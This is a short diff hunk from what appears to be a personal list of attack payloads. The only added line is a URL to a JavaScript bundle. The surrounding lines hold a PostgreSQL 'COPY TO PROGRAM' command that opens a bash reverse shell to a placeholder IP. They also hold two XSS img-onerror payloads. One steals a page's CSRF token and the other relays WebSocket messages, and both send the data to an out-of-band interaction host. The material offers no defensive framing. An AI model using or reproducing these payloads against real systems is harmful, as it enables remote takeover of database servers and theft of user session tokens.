@@ -42,6 +42,7 @@ END $$ LANGUAGE plpgsql;
 CREATE EXTENSION dblink;
 COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"';
 
+https://test.com/fe/main.ef606a2dcaa4f809.js
 
 <img src="x" onerror="var csrf=document.querySelector('input[name=csrf_token]').value;fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?token='+csrf);">
 "><img src=x onerror="var ws=new WebSocket('ws://example.com/socket');ws.onmessage=function(e){fetch('https://jasnvmlyykcejcjkawudfsxg0s7amgauf.oast.site/?data='+encodeURIComponent(e.data));};">
